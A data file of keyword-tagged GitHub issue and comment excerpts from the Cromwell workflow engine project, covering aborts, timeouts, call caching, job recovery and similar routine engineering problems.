Safety,"We are trying to abort a job in FireCloud using cromwell .21. The workflow appears stuck in submitted state. It appears to have no calls. Is there are race condition that is we abort too soon the job is stuck?. ```; ~/projects/rawls [develop*] $ curl -H ""Authorization: Bearer `gcloud auth print-access-token`"" https://cromwell2.dsde-alpha.broadinstitute.org/api/workflows/v1/b29c0ef3-e988-4d70-8093-bdd1a039170d/status; {; ""status"": ""Submitted"",; ""id"": ""b29c0ef3-e988-4d70-8093-bdd1a039170d""; }(dvoet@wm163-585) 14:55; ~/projects/rawls [develop*] $ curl -H ""Authorization: Bearer `gcloud auth print-access-token`"" https://cromwell2.dsde-alpha.broadinstitute.org/api/workflows/v1/b29c0ef3-e988-4d70-8093-bdd1a039170d/metadata; {; ""submittedFiles"": {; ""inputs"": ""{\""test.hello.name\"":\""subject_HCC1143\""}"",; ""workflow"": ""task hello {\n String? name\n\n command {\n echo 'hello ${name}!'\n }\n output {\n File response = stdout()\n }\n runtime {\n docker: \""ubuntu\""\n }\n}\n\nworkflow test {\n call hello\n}"",; ""options"": ""{\n \""default_runtime_attributes\"": {\n \""zones\"": \""us-central1-c us-central1-f\""\n },\n \""google_project\"": \""broad-dsde-alpha\"",\n \""auth_bucket\"": \""gs://cromwell-auth-broad-dsde-alpha\"",\n \""refresh_token\"": \""cleared\"",\n \""final_workflow_log_dir\"": \""gs://fc-ceb841f8-e512-4f70-831b-eb2c43af9b42/d938c20b-916d-4bd5-a132-533c72a84eb0/workflow.logs\"",\n \""account_name\"": \""test.firec@gmail.com\"",\n \""jes_gcs_root\"": \""gs://fc-ceb841f8-e512-4f70-831b-eb2c43af9b42/d938c20b-916d-4bd5-a132-533c72a84eb0\""\n}""; },; ""calls"": {. },; ""outputs"": {. },; ""id"": ""b29c0ef3-e988-4d70-8093-bdd1a039170d"",; ""inputs"": {. },; ""submission"": ""2017-01-20T16:37:31.589Z""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885:17,abort,abort,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885,2,['abort'],['abort']
Safety,"We are trying to be 100% heads down on cwl work for probably another couple of weeks. If this is a raging fire we can divert attention from that but that not without cost towards that and the ripple effect on other goals. So is this “this sucks please fix soon” or “OMG we’re blocked, at the risk of cheesing off other users this needs to be fixed right this second”",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358518084:292,risk,risk,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3156#issuecomment-358518084,1,['risk'],['risk']
Safety,We currently do not have automated CWL testing in Centaur. this puts us at risk for regressions. Start w/ ; * 1st-workflow.cwl; * three_step.cwl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2835:75,risk,risk,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2835,1,['risk'],['risk']
Safety,"We have a cromwell task that failed with the unhelpful error message: `Unexpected failure in EJEA (root cause not captured).` After investigation we found that the task was being killed by the google cloud compute system:; ```; ""error"": {; ""code"": 1,; ""message"": ""Operation canceled at 2017-07-23T01:01:39-07:00 because it is older than 6 days""; },; ```; It would be better if cromwell was able to report this error directly, so we don't have to look at the gcloud operations properties. Looking at the cromwell logs I see this sequence:; ```; 2017-07-23 08:09:42 [cromwell-system-akka.actor.default-dispatcher-3449] WARN c.e.w.l.e.WorkflowExecutionActor - WorkflowExecutionActor-f15009ab-b5bc-47ac-b832-3d0ae2f15888 [UUID(f15009ab)]: WorkflowExecutionActor [UUID(f15009ab)] received an unhandled message: AbortedResponse(PairedEndSingleSampleWorkflow.MarkDuplicates:-1:1) in state: WorkflowExecutionInProgressState; 2017-07-23 08:09:47 [cromwell-system-akka.actor.default-dispatcher-3375] ERROR c.e.workflow.WorkflowManagerActor - WorkflowManagerActor Workflow f15009ab-b5bc-47ac-b832-3d0ae2f15888 failed (during ExecutingWorkflowState): Unexpected failure in EJEA (root cause not captured).; ```. In this case the google operations ID is `EOjNtPvUKxiOgeqc763--TEgn6KQ6Z4NKg9wcm9kdWN0aW9uUXVldWU`. I can provide more operations IDs if necessary.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2496:806,Abort,AbortedResponse,806,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2496,1,['Abort'],['AbortedResponse']
Safety,"We have a workflow that scatters 95 wide as its first step. When running with `read_from_cache=false` the workflow chugs along normally. When we allow the same workflow to read from the cache, Cromwell seems to lock up after the first handful of cache hits(~30). Cromwell will stop responding to api requests and after some time with logs being written the workflow that was getting the cache hits will hit 503 and timeout errors. When running the workflow with `read_from_cache=false` we run into none of these errors. Timeout Error. ```; 2016-05-05 17:37:02,285 cromwell-system-akka.actor.default-dispatcher-25 WARN - Configured registration timeout of 1 second expired, stoppingw; ```. 503 Error. ```; Exception occurred while attempting to copy outputs from gs://broad-gotc-dev-storage/cromwell_execution/JointGenotyping/ccba2c79-c998-4f03-b736-af097391db66/call-SplitGvcf/shard-50 to gs://broad-gotc-dev-storage/cromwell_execution/JointGenotyping/7164dc88-af61-4ea6-8a73-f0b79594ae9a/call-SplitGvcf/shard-50. com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable. {. ""code"" : 503,. ""errors"" : [ {. ""domain"" : ""global"",. ""message"" : ""Backend Error"",. ""reason"" : ""backendError"". } ],. ""message"" : ""Backend Error"". }. at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]. at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]. at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]. at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]. at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]. at com.google.api.client.google",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/794:415,timeout,timeout,415,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/794,3,"['Timeout', 'timeout']","['Timeout', 'timeout']"
Safety,We made changes to avoid changing the model that was returned (opting for metadata instead) those changes aren't reflected here. I will update this PR shortly.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/830#issuecomment-221861480:19,avoid,avoid,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/830#issuecomment-221861480,1,['avoid'],['avoid']
Safety,We really do have a business case for doing this once per workflow. Having this at the task level will run prepare() / cleanup() as many times as we have calls to run on that backend. This specific use case also involves some sensitive data which we'd particularly like to avoid making many copies of unnecessarily.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/439#issuecomment-185479460:273,avoid,avoid,273,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/439#issuecomment-185479460,1,['avoid'],['avoid']
Safety,"We recently adjusted this timeout, I would try again with the latest `develop` build. The errors are likely happening because Cromwell is putting work into its IO queue faster than it can finish it. There's a backpressure system that aims to prevent this by stopping Cromwell picking up new work when IO operations aren't getting finished fast enough, but in this case it isn't responsive enough to keep you out of trouble. If you continue seeing these errors, you can tune down `system.io.command-backpressure-staleness` to make the engine more sensitive to long IO queues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2296872912:26,timeout,timeout,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-2296872912,2,['timeout'],['timeout']
Safety,We redundantly re-verified the absence of the problem class [0] by [unzipping](https://docs.oracle.com/javase/tutorial/deployment/jar/unpack.html) the shipping Cromwell JAR and manually checking that the path is empty. [0] `org/apache/logging/log4j/core/lookup/JndiLookup.class`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802:3,redund,redundantly,3,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6588#issuecomment-996997802,1,['redund'],['redundantly']
Safety,We should probably be clear (particularly for hotfix accepters) that this is unlikely to fix-fix aborts but specifically what we believe it'll resolve.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-292595363:97,abort,aborts,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-292595363,2,['abort'],['aborts']
Safety,"We'd need a way to detect that a job was timed out rather than genuinely preempted (either another error code or by analyzing the total run time).; We'd also need a special case in the ""start this as a preemptible VM?"" logic to not start the subsequent job preemptibly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-293705422:19,detect,detect,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-293705422,1,['detect'],['detect']
Safety,We've seen a few times the IO error `Failed to evaluate job outputs [...] Futures timed out after [10 seconds]` in tests. I hypothesize that file read times from buckets may suffer from occasional outliers due to 🌩. I know this is the right timeout to change thanks to [this branch](https://github.com/broadinstitute/cromwell/compare/aen_make_it_timeout?expand=1) where I induced error `Failed to evaluate job outputs [...] Futures timed out after [10 microseconds]`,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4036:241,timeout,timeout,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4036,1,['timeout'],['timeout']
Safety,We've seen in centaur local testing that we fail at times because cromwell is reading an output file before all of its contents has been written and we have no way to detect this (except via the artificial expectation management of centaur). There was some handwaving about filesystems and putting in sleeps but both of these seem like the wrong path. @kcibul this seems like this could go under the reliability umbrella?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1868:167,detect,detect,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1868,1,['detect'],['detect']
Safety,"Well if it's doing it only when the job is finished I would even make it `warn` instead of `info`. > Right now a workflow is not robust enough to run it on a/our HPC, see also on gitte:; > Peter van 't Hof @ffinfo Aug 26 19:05; > ye I see what you mean but it's the only way. When in SGE your job is killed he never get to the point of $? > rc; > so cromwell can not detect is a job is killed, meaning it will end in a endless loop polling for rc what never will come anymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that'",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:367,detect,detect,367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,2,['detect'],['detect']
Safety,"What do you mean ""metricable"" isn't a word?. \<looks quickly on google\>. ... ""I am **not** using [Metrizable](https://www.yourdictionary.com/metrizable)...!"". ---. Additional commentary and/or things worth sanity checking me on:. * We lose ""root workflow ID"" and ""bucket"" from the log message.; * We gain task name and hog group in the metric path.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5470:207,sanity check,sanity checking,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5470,1,['sanity check'],['sanity checking']
Safety,What is being done is not exactly what this ticket says but it does test that at least one job is recovered properly during centaur tests.; I think this can be closed,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2111#issuecomment-329782508:98,recover,recovered,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2111#issuecomment-329782508,1,['recover'],['recovered']
Safety,"What is the optimal order, and what would the effort be to implement it? Any risks?. Finally, how often do we get questions and complaints about it today? Do you expect that to go up in the near future?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-324418249:77,risk,risks,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-324418249,1,['risk'],['risks']
Safety,When Cromwell comes online it detects if there are any unfinished workflows in the system and will pick those back up.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/755:30,detect,detects,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/755,1,['detect'],['detects']
Safety,"When I run scatter I get ""shard-n"". It would be nice to have an option to define shards names, for instance in some pipelines I would be happy to use sample names instead of shard-n to be able to easily detect what sample was processed in a wrong way.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2265:203,detect,detect,203,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2265,1,['detect'],['detect']
Safety,"When [creating the zipped import resolver](https://github.com/broadinstitute/cromwell/blob/develop/languageFactories/language-factory-core/src/main/scala/cromwell/languages/util/ImportResolver.scala#L133), we create a zip file on disk with format; ```; /tmp/imports_workflow_a5756f37-a2dc-4e57-be4e-0d0531812fef_5414558548666056879.zip; ```; and then unzip it into a directory like; ```; /tmp/imports_workflow_a5756f37-a2dc-4e57-be4e-0d0531812fef_5414558548666056879.zip3360767550785143230; ```; We immediately clean up the temporary file, but the temporary directory sticks around forever. Import resolvers are instantiated from scratch during restart, so it should be safe to clean up the directory as soon as the workflow stops. ---. For extra credit:. Writing temporary items to disk has two very undesirable features:; - Global scope; - Infinite lifetime. Find and adopt a solution that lets us completely isolate workflows from each other's filesystem side-effects, and lets the JVM do the cleanup for us with garbage collection as soon as the workflow stops. I think we could pull this off with NIO, but I have not done my homework on this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4406:670,safe,safe,670,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4406,1,['safe'],['safe']
Safety,"When a user specifies a Docker image of `whoever/myimage:latest`, they almost certainly don't want to avoid to a version of the job that was latest two years ago. This is the current behaviour. Please instead resolve the string to a Docker image hash and use that for call caching instead. The final Docker hash used should end up in call-level metadata so we can know what it is later. Tagging @abaumann so he knows I made this and can chime in to agree with me if there are any questions. Further Refinement from Office Hours:; - Supported Docker Image Repository; -- must have: DockerHub, GCR; -- should have: ECR if it doesn't delay, otherwise a separate ticket; -- bonus points to verify this works against Quay ; - Only API v2 supported ; - Support for both public and private images",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1617:102,avoid,avoid,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1617,1,['avoid'],['avoid']
Safety,"When cromwell is halted (ctl-c), it aborts jobs, but then starts new jobs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600:36,abort,aborts,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600,1,['abort'],['aborts']
Safety,"When cromwell needs to recover many jobs at once, or check many caches at once it seems to only do one at a time. I found this with the following wdl, scattered by about 300 ways, run on broad filesystem with the SGE backend. I'd be happy to provide the json and list of inputs if needed. ```; task Decapitate {; 	File inputFile; 	String outputFilename. 	command {; 		tail -n+2 ${inputFile}; 	}; 	runtime {; 		memory: ""4 GB""; 	}; 	output {; 		Array[Array[String]] outputMatrix=read_tsv(stdout()); 	}; }. task BreakUpRow {; 	String PROJECT; 	String SAMPLE; 	String DATA_TYPE; 	String COMPARE_SAMPLE ; 	String COMPARE_PROJECT; 	String CLEAN_SAMPLE; 	String CLEAN_COMPARE_SAMPLE. 	command {; 		#do nothing; 	}; 	runtime {; 		memory: ""1 GB""; 	}; 	output {; 		Array[File] bams = [""/seq/picard_aggregation/${PROJECT}/${CLEAN_SAMPLE}/current/${CLEAN_SAMPLE}.bam"", ""/seq/picard_aggregation/${COMPARE_PROJECT}/${CLEAN_COMPARE_SAMPLE}/current/${CLEAN_COMPARE_SAMPLE}.bam""]; 		Array[File] indexes = [""/seq/picard_aggregation/${PROJECT}/${CLEAN_SAMPLE}/current/${CLEAN_SAMPLE}.bai"", ""/seq/picard_aggregation/${COMPARE_PROJECT}/${CLEAN_COMPARE_SAMPLE}/current/${CLEAN_COMPARE_SAMPLE}.bai""]; 		File genotypes = ""/seq/references/reference_genotypes/non-hapmap/${PROJECT}/Homo_sapiens_assembly19/${CLEAN_SAMPLE}.vcf""; 		String PROJECT_out = ""${PROJECT}""; 		String SAMPLE_out = ""${SAMPLE}""; 		String DATA_TYPE_out = ""${DATA_TYPE}""; 		String COMPARE_SAMPLE_out = ""${COMPARE_SAMPLE}""; 		String COMPARE_PROJECT_out = ""${COMPARE_PROJECT}""; 		String CLEAN_SAMPLE_out = ""${CLEAN_SAMPLE}""; 		String CLEAN_COMPARE_SAMPLE_out = ""${CLEAN_COMPARE_SAMPLE}""; 	}. }. task Fingerprint {; String PICARD; File input_bam; File input_bam_index; File haplotype_database_file; File genotypes; String vcf_sample; String output_name; ; command {; java -Dsamjdk.buffer_size=131072 -XX:GCTimeLimit=50 -XX:GCHeapFreeLimit=10 -Xmx1024m \; -jar ${PICARD} \; CheckFingerprint \; INPUT=${input_bam} \; OUTPUT=${output_name} \; GENOTYPES=${genotypes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1844:23,recover,recover,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1844,1,['recover'],['recover']
Safety,"When running a task on docker locally, if the task is aborted, the script that feeds the wdl command into the docker container will be destroyed - but not the docker itself. ; Before abort:. ```; wm0e9-683:cromwell tjeandet$ ps -ef | grep c72df249-ccf5-460b-8654-9606a655c669; 1250915218 11002 10990 0 6:13PM ?? 0:00.00 /bin/bash -c cat cromwell-executions/w/c72df249-ccf5-460b-8654-9606a655c669/call-t/script | docker run --rm -v /Users/tjeandet/Codebase/cromwell/cromwell-executions/w/c72df249-ccf5-460b-8654-9606a655c669/call-t:/root/w/c72df249-ccf5-460b-8654-9606a655c669/call-t -i ubuntu:latest /bin/bash <&0; 1250915218 11004 11002 0 6:13PM ?? 0:00.15 docker run --rm -v /Users/tjeandet/Codebase/cromwell/cromwell-executions/w/c72df249-ccf5-460b-8654-9606a655c669/call-t:/root/w/c72df249-ccf5-460b-8654-9606a655c669/call-t -i ubuntu:latest /bin/bash; 1250915218 11015 2783 0 6:13PM ttys000 0:00.00 grep c72df249-ccf5-460b-8654-9606a655c669; ```. After:. ```; wm0e9-683:cromwell tjeandet$ ps -ef | grep c72df249-ccf5-460b-8654-9606a655c669; 1250915218 11004 1 0 6:13PM ?? 0:00.15 docker run --rm -v /Users/tjeandet/Codebase/cromwell/cromwell-executions/w/c72df249-ccf5-460b-8654-9606a655c669/call-t:/root/w/c72df249-ccf5-460b-8654-9606a655c669/call-t -i ubuntu:latest /bin/bash; 1250915218 11021 2783 0 6:14PM ttys000 0:00.00 grep c72df249-ccf5-460b-8654-9606a655c669; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1126:54,abort,aborted,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1126,2,['abort'],"['abort', 'aborted']"
Safety,"When running jobs on backends with job runtime limits such as LSF or SLURM, jobs reaching the runtime limits are killed by the backend. [Cromwell never detects that this occurs](http://gatkforums.broadinstitute.org/wdl/discussion/9542/does-cromwell-detect-task-failures-based-on-check-alive), and will wait forever for a job that is already dead. It would be helpful to configure periodic checks for whether tasks are still alive, and enter failure modes for non-zero return codes when unfinished tasks are no longer alive.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2281:152,detect,detects,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2281,2,['detect'],"['detect-task-failures-based-on-check-alive', 'detects']"
Safety,"When the workflow-restart config option is set to false, incomplete workflows will not be restarted, and instead all incomplete workflows are aborted. . Note: Still need to update ReadMe. Questions: The sys.addShutdownHook takes about a minute to start startup (there's a minute long wait between the logs) which seems too long?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/841:142,abort,aborted,142,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/841,1,['abort'],['aborted']
Safety,"When there are a lot (~1800 or as many as 3000) of cache hits in a workflow, timeouts or other errors talking to Google often occur (probably can all be fixed with added retries). Impact: High. Prevents us from using call caching for 20k sample sets, which in turn requires us to manually stitch together outputs from multiple workflows to gather all the successes together, which is prone to error. When it is feasible to use, this problem still often requires us to repeatedly relaunch the same workflow, duplicating the data many times. This can be tested by the same WDL used to verify #1185",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1444:77,timeout,timeouts,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1444,1,['timeout'],['timeouts']
Safety,"When using a docker hash in V25 in order to get call caching I get the following error: . ```; 2017-05-01 18:06:39 [cromwell-system-akka.actor.default-dispatcher-3670] ERROR c.e.w.l.e.EngineJobExecutionActor - Failed copying cache results for job GenotypeGVCFsComparison.IndexVCF:-1:1, invalidating cache entry.; java.io.IOException: Failed to copy gs://dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz to gs://broad-dsde-methods/cromwell-execution-25/GenotypeGVCFsComparison/c5bc4f99-d969-49ca-9e2e-a3dac7a4b12a/call-IndexVCF/dsde-palantir/SnapshotExperiment2015/CEUTrio/gvcfs/NA12878.d691bf66-37af-4375-9c09-6a6607f322e8.g.vcf.gz; 	at cromwell.core.path.PathCopier$$anonfun$copy$2.applyOrElse(PathCopier.scala:49); 	at cromwell.core.path.PathCopier$$anonfun$copy$2.applyOrElse(PathCopier.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.core.path.PathCopier$.copy(PathCopier.scala:48); 	at cromwell.backend.standard.StandardCacheHitCopyingActor.duplicate(StandardCacheHitCopyingActor.scala:36); 	at cromwell.backend.callcaching.CacheHitDuplicating$$anonfun$copySimpletons$1.apply(CacheHitDuplicating.scala:66); 	at cromwell.backend.callcaching.CacheHitDuplicating$$anonfun$copySimpletons$1.apply(CacheHitDuplicating.scala:62); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2229:963,recover,recoverWith,963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2229,1,['recover'],['recoverWith']
Safety,"When we traced through the new actor model there was a lot of wonkiness in how an abort request works its way through the system. There were end runs being made, direct shortcuts to specific things, etc. . Our thoughts were:; - Make sure that the whole process is async. An abort request returns immediately and the workflow is set to an `aborting` state (as opposed to `aborted` and ??? if it fails to abort); - Have the abort request work its way through the workflow in a more logical manner, working down from the `WorkflowActor` to the `WorkflowExecutionActor` to the `EJEA`, etc; - Have each stage watch for all of its children (not necessarily in a supervision sense) to complete or not before sending the success/failure response back up",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1414:82,abort,abort,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1414,6,['abort'],"['abort', 'aborted', 'aborting']"
Safety,"Whenever I run workflow with mistake a see some weird errors in cromwell-server akka-logs while nothing is written to cromwell-workflow-logs; Here is a simple example:; ```; workflow worms {. File samplesFile. #Name \t File; Array[Array[File]] samples = read_tsv(samplesFile). scatter (sample in samples) {; call stats {; input:; fileName = sample(0), #simple mistake with ""()"" instead of ""[]""; file = sample(1); }; }; }. task stats {. String fileName; File file. command {; /opt/sratoolkit/sra-stat ${file} > stats.txt; }. runtime {; docker: ""itsjeffreyy/sratoolkit""; }. output {; File stats = ""stats.txt""; }; }; ```; Here I make quite typical mistake by using () instead of []. But when I send it to the server for execution it I get an empty cromwell-workflow-logs folder and errors are displayed only in stdout of the cromwell server. What I expect is to see them in cromwell-workflow-logs (if my expectations are wrong, it would be nice to have in documentation a description of which log folder are for which type of errors); By the way, according to the error I get, you use runtime reflection to search for ""sample"" function (that is perceived as a function instead of array due to round brackets). Not the safest, way to identify functions, IMHO.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2210:1215,safe,safest,1215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2210,1,['safe'],['safest']
Safety,Wire through PAPIv2 timeouts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4946:20,timeout,timeouts,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4946,1,['timeout'],['timeouts']
Safety,"With Cromwell 30.2:. Attempting to abort a workflow mostly running on SGE triggers lots of these errors:. 2018-02-09 11:52:46,500 cromwell-system-akka.dispatchers.engine-dispatcher-96 WARN - unhandled event EngineLifecycleActorAbortCommand in state SubWorkflowRunningState. Queued and running SGE jobs continue as if nothing happened.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3259:35,abort,abort,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3259,1,['abort'],['abort']
Safety,"With compliments to @mcovarr for the rebase base. Creates hashes for the following:; - command; - backend name; - output expression; - non-file inputs (as simpletons); - file input paths (according to config). Not included in this PR:; - backend specific hashes (runtime attributes, docker, file contents). Note that if you want anything to actually be written you'll want the following options (to avoid a hashing failure); - `lookup-docker-hash=false`; - `hash-docker-names=false`; - `hash-file-paths=true` -- actually you could leave this false but... then you'd always cache hit regardless of what files you're using!; - `hash-file-contents=false`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1291:399,avoid,avoid,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1291,1,['avoid'],['avoid']
Safety,With the add-on that this should *not* find its way into runtime attributes .... This should be relatively low effort and risk. The risk would be that whenever we don't get something call caching related correct that causes a lot of angst,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327550937:122,risk,risk,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-327550937,2,['risk'],['risk']
Safety,"Won't the `invalidate-bad-cache-results` setting work for you? It's not a timeout, it just tells Cromwell to gracefully handle missing files when attempting to retrieve from the cache. Seems to work pretty well in my hands (we have a similar situation here so I actually wrote a test for this).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5174#issuecomment-530831145:74,timeout,timeout,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5174#issuecomment-530831145,1,['timeout'],['timeout']
Safety,Workflow Actor - Call Recover appropriately,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/664:22,Recover,Recover,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/664,1,['Recover'],['Recover']
Safety,Workflow abort fails to stop SGE jobs,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3259:9,abort,abort,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3259,1,['abort'],['abort']
